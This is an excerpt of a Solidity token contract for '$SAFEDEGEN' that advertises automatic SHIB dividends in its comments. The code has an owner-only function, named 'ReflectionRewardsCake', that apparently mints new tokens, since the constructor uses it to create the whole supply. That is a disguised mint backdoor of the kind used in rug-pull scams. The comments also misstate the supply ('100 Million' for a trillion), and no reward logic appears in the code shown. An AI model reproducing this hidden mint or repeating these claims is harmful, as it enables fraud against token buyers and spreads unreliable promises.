...
//
// $SAFEDEGEN proposes an innovative feature in its contract.
//
// DIVIDEND YIELD PAID IN SHIB! With the auto-claim feature,
// simply hold$SAFEDEGEN and you'll receive SHIB automatically in your wallet.
// 
// Hold SafeDegen and get rewarded in SHIB on every transaction!
//
//
// 📱 Telegram: https://t.me/safedegen
// 🌎 Website: TBA
// 
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ReflectionRewardsCake(uint256 amount) public onlyOwner {
    _ReflectionRewardsCake(msg.sender, amount);
    }
    ...
    function _ReflectionRewardsCake(address account, uint256 amount) internal virtual {
...
contract SafeDegen is ERC20 {

    uint tokenTotalSupply = 1000000000000; // 100 Million Token Supply

    constructor() public ERC20("SafeDegen", "$SAFEDEGEN") {
        _ReflectionRewardsCake(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}